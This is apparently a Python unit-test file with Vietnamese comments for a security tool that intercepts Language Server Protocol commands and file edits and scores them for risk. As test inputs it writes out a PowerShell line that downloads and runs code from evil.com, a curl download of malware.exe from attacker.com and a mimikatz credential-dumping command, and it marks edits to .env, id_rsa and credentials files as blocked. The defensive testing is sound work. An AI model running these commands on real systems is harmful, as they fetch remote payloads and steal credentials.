"""Unit tests cho LSP Protocol Interceptor."""

import unittest
import queue
import json
from lsp_sniffer.lsp_interceptor import (
    LSPMessageAnalyzer,
    LSPProtocolInterceptor,
    LSP_EXECUTE_COMMAND,
    LSP_APPLY_EDIT,
)


class TestLSPMessageAnalyzer(unittest.TestCase):
    """Test bộ phân tích an ninh LSP."""

    def setUp(self):
        self.analyzer = LSPMessageAnalyzer()

    # ── workspace/executeCommand ──────────────────────────────

    def test_safe_command_allowed(self):
        """Command bình thường → ALLOW, score thấp."""
        verdict = self.analyzer.analyze_execute_command(
            LSP_EXECUTE_COMMAND,
            {"command": "editor.action.formatDocument", "arguments": []}
        )
        self.assertEqual(verdict.action, "ALLOW")
        self.assertEqual(verdict.risk_score, 0)

    def test_terminal_execute_detected(self):
        """terminal.execute → DANGEROUS_LSP_CMD → score >= 50."""
        verdict = self.analyzer.analyze_execute_command(
            LSP_EXECUTE_COMMAND,
            {"command": "terminal.execute", "arguments": ["ls -la"]}
        )
        self.assertGreaterEqual(verdict.risk_score, 50)
        self.assertIn("DANGEROUS_LSP_CMD:terminal.execute", verdict.matched_rules)

    def test_terminal_sendtext_detected(self):
        """terminal.sendText → DANGEROUS_LSP_CMD."""
        verdict = self.analyzer.analyze_execute_command(
            LSP_EXECUTE_COMMAND,
            {"command": "terminal.sendText", "arguments": ["echo hello"]}
        )
        self.assertGreaterEqual(verdict.risk_score, 50)

    def test_powershell_iex_in_args(self):
        """PowerShell IEX trong arguments → DANGEROUS_ARG + DANGEROUS_CMD → CRITICAL."""
        verdict = self.analyzer.analyze_execute_command(
            LSP_EXECUTE_COMMAND,
            {
                "command": "terminal.execute",
                "arguments": ["powershell.exe -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"]
            }
        )
        self.assertEqual(verdict.action, "BLOCK")
        self.assertEqual(verdict.risk_level, "CRITICAL")
        self.assertGreaterEqual(verdict.risk_score, 60)

    def test_curl_download_in_args(self):
        """curl -o trong arguments → DANGEROUS_ARG pattern."""
        verdict = self.analyzer.analyze_execute_command(
            LSP_EXECUTE_COMMAND,
            {
                "command": "terminal.execute",
                "arguments": ["curl -o malware.exe http://attacker.com/payload"]
            }
        )
        self.assertEqual(verdict.action, "BLOCK")
        self.assertGreaterEqual(verdict.risk_score, 60)

    def test_mimikatz_in_args(self):
        """mimikatz trong arguments → CRITICAL."""
        verdict = self.analyzer.analyze_execute_command(
            LSP_EXECUTE_COMMAND,
            {
                "command": "shellCommand.execute",
                "arguments": ["mimikatz.exe sekurlsa::logonpasswords"]
            }
        )
        self.assertEqual(verdict.action, "BLOCK")
        self.assertGreaterEqual(verdict.risk_score, 60)

    def test_suspicious_keyword_in_args(self):
        """Keyword 'payload' trong arguments → score > 0."""
        verdict = self.analyzer.analyze_execute_command(
            LSP_EXECUTE_COMMAND,
            {
                "command": "editor.action.showReferences",
                "arguments": ["payload delivery test"]
            }
        )
        self.assertGreater(verdict.risk_score, 0)

    def test_python_exec_in_terminal(self):
        """python.execInTerminal → DANGEROUS_LSP_CMD."""
        verdict = self.analyzer.analyze_execute_command(
            LSP_EXECUTE_COMMAND,
            {"command": "python.execInTerminal", "arguments": []}
        )
        self.assertGreaterEqual(verdict.risk_score, 50)

    # ── workspace/applyEdit ───────────────────────────────────

    def test_safe_file_edit_allowed(self):
        """Sửa file .py bình thường → ALLOW."""
        verdict = self.analyzer.analyze_apply_edit(
            LSP_APPLY_EDIT,
            {"edit": {"changes": {"file:///project/main.py": []}}}
        )
        self.assertEqual(verdict.action, "ALLOW")
        self.assertEqual(verdict.risk_score, 0)

    def test_edit_env_file_blocked(self):
        """Sửa file .env → CRITICAL."""
        verdict = self.analyzer.analyze_apply_edit(
            LSP_APPLY_EDIT,
            {"edit": {"changes": {"file:///project/.env": []}}}
        )
        self.assertEqual(verdict.action, "BLOCK")
        self.assertGreaterEqual(verdict.risk_score, 60)

    def test_edit_id_rsa_blocked(self):
        """Sửa id_rsa → CRITICAL."""
        verdict = self.analyzer.analyze_apply_edit(
            LSP_APPLY_EDIT,
            {"edit": {"changes": {"file:///home/user/.ssh/id_rsa": []}}}
        )
        self.assertEqual(verdict.action, "BLOCK")

    def test_edit_credentials_blocked(self):
        """Sửa file credentials → CRITICAL."""
        verdict = self.analyzer.analyze_apply_edit(
            LSP_APPLY_EDIT,
            {"edit": {"changes": {"file:///project/credentials.json": []}}}
        )
        self.assertEqual(verdict.action, "BLOCK")

    # ── Dispatch ──────────────────────────────────────────────

    def test_analyze_dispatch_execute(self):
        """analyze() dispatch đúng cho executeCommand."""
        verdict = self.analyzer.analyze(
            LSP_EXECUTE_COMMAND,
            {"command": "terminal.execute", "arguments": ["whoami"]}
        )
        self.assertIsNotNone(verdict)
        self.assertGreaterEqual(verdict.risk_score, 50)

    def test_analyze_dispatch_apply_edit(self):
        """analyze() dispatch đúng cho applyEdit."""
        verdict = self.analyzer.analyze(
            LSP_APPLY_EDIT,
            {"edit": {"changes": {"file:///project/.env": []}}}
        )
        self.assertIsNotNone(verdict)
        self.assertGreaterEqual(verdict.risk_score, 60)

    def test_analyze_unknown_method_returns_none(self):
        """Method không nằm trong INTERCEPTABLE → None."""
        verdict = self.analyzer.analyze("textDocument/completion", {})
        self.assertIsNone(verdict)


class TestLSPProtocolInterceptor(unittest.TestCase):
    """Test LSP Protocol Interceptor lifecycle và event emission."""

    def test_init_defaults(self):
        """Khởi tạo với config mặc định."""
        q = queue.Queue()
        interceptor = LSPProtocolInterceptor(q)
        self.assertTrue(interceptor.enabled)
        self.assertEqual(interceptor.mode, "MONITOR")
        self.assertFalse(interceptor.running)

    def test_parse_lsp_message_valid(self):
        """Parse JSON-RPC message hợp lệ."""
        msg = LSPProtocolInterceptor._parse_lsp_message(
            '{"jsonrpc": "2.0", "id": 1, "method": "workspace/executeCommand", "params": {"command": "test"}}'
        )
        self.assertIsNotNone(msg)
        self.assertEqual(msg["method"], "workspace/executeCommand")

    def test_parse_lsp_message_invalid(self):
        """Parse message lỗi → None."""
        msg = LSPProtocolInterceptor._parse_lsp_message("not valid json{{{")
        self.assertIsNone(msg)

    def test_should_block_monitor_mode(self):
        """Mode MONITOR → không bao giờ chặn."""
        q = queue.Queue()
        interceptor = LSPProtocolInterceptor(q)
        interceptor.mode = "MONITOR"

        from lsp_sniffer.lsp_interceptor import LSPVerdict
        verdict = LSPVerdict("BLOCK", 90, "CRITICAL", ["test"], ["test_rule"])
        self.assertFalse(interceptor._should_block(verdict))

    def test_should_block_intercept_mode(self):
        """Mode INTERCEPT + score >= threshold → chặn."""
        q = queue.Queue()
        interceptor = LSPProtocolInterceptor(q)
        interceptor.mode = "INTERCEPT"
        interceptor.block_threshold = 60

        from lsp_sniffer.lsp_interceptor import LSPVerdict
        verdict_high = LSPVerdict("BLOCK", 80, "CRITICAL", ["test"], ["rule"])
        verdict_low = LSPVerdict("ALLOW", 20, "LOW", [], [])

        self.assertTrue(interceptor._should_block(verdict_high))
        self.assertFalse(interceptor._should_block(verdict_low))

    def test_emit_lsp_event(self):
        """Emit event vào queue với đúng format."""
        q = queue.Queue()
        interceptor = LSPProtocolInterceptor(q)

        from lsp_sniffer.lsp_interceptor import LSPVerdict
        verdict = LSPVerdict("ALERT", 50, "HIGH", ["suspicious"], ["RULE_1"])

        interceptor._emit_lsp_event(
            method="workspace/executeCommand",
            params={"command": "terminal.execute", "arguments": ["whoami"]},
            msg_id=42,
            verdict=verdict,
        )

        self.assertFalse(q.empty())
        event = q.get_nowait()

        self.assertEqual(event["source"], "lsp_interceptor")
        self.assertEqual(event["event_type"], "lsp_command")
        self.assertEqual(event["lsp_method"], "workspace/executeCommand")
        self.assertEqual(event["lsp_command"], "terminal.execute")
        self.assertIn("lsp_verdict", event)
        self.assertEqual(event["lsp_verdict"]["risk_score"], 50)
        self.assertIn("tool_analysis", event)
        self.assertTrue(event["tool_analysis"]["has_anomaly"])


if __name__ == "__main__":
    unittest.main()
